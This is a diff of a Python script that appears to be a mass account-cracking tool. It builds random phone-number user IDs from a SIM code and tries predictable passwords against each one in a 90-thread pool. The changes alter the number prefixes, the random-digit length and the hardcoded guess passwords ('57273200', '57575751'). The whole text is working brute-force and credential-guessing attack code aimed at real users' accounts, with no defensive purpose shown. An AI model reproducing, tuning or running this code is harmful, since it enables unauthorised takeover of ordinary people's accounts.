@@ -179,14 +179,14 @@ def v2():
     user=[]
     os.system('clear')
     print(logo)
-    print('[+] BD NUMBER  => 016 017 018 019')
+    print('[+] BD NUMBER  => 7679 7898 6798')
     kode = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
     kodex = ''.join(random.choice(string.digits) for _ in range(2))
     kod = ''.join(random.choice(string.digits) for _ in range(2))
     print('[+] 2000. 5000. 10000. 15000. 50000')
     limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
     for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        nmp = ''.join(random.choice(string.digits) for _ in range(2))
         user.append(nmp)
     with ThreadPool(max_workers=90) as akash:
         os.system('clear')
@@ -197,7 +197,7 @@ def v2():
         print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
         for guru in user:
             uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'304050','607080']
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'57273200','57575751']
             akash.submit(rcrack1,uid,pwx,tl)
     print(linex)
     print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
